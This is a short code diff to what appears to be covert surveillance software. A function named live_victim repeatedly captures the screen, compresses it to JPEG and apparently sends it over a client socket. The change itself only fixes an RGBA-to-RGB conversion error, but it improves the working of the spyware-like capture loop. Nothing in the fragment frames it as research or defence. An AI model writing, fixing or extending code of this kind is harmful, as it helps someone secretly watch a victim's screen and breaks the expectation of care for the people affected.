@@ -52,6 +52,8 @@ def live_victim(client_socket):
     try:
         while True:
             screenshot = ImageGrab.grab()
+            if screenshot.mode == "RGBA":
+                screenshot = screenshot.convert("RGB")
             buffer = io.BytesIO()
             screenshot.save(buffer, format="JPEG", quality=30)
             buffer.seek(0)
